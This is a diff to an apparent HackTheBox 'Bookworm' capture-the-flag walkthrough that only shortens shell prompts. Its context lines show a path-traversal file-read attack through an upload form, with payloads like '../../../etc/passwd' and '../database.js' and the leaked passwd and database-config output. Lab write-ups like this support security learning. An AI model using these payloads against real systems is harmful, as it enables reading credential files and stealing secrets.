@@ -434,8 +434,7 @@ Don't forget create directory upload . After a few minutes i ran `web.py` and `b
 
 Update our payload to utilize the upload form
 ```
-┌──(root㉿kali)-[/home/…/Desktop/htb/bookworm/upload]
-└─# unzip upload.zip          
+# unzip upload.zip          
 
 Archive:  upload.zip
   inflating: Alice's Adventures in Wonderland.pdf  
@@ -445,8 +444,7 @@ Archive:  upload.zip
 I've got the .pdf file so now let's using strings command to verify vulnerable lfi or not
 
 ```
-┌──(root㉿kali)-[/home/…/Desktop/htb/bookworm/upload]
-└─# strings Unknown.pdf                           
+# strings Unknown.pdf                           
 root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
 bin:x:2:2:bin:/bin:/usr/sbin/nologin
@@ -502,8 +500,7 @@ The website is used Express , Express usually  used this name files and mostly t
 I thinking `database.js` have the password for ssh let's we get it . Our just using same payload at the above our just change the name file `../../../etc/passwd` to `../database.js` 
 
 ```
-┌──(root㉿kali)-[/home/…/Desktop/htb/bookworm/upload]
-└─# strings Unknown.pdf             
+# strings Unknown.pdf             
 const { Sequelize, Model, DataTypes } = require("sequelize");
 //const sequelize = new Sequelize("sqlite::memory::");
 const sequelize = new Sequelize(
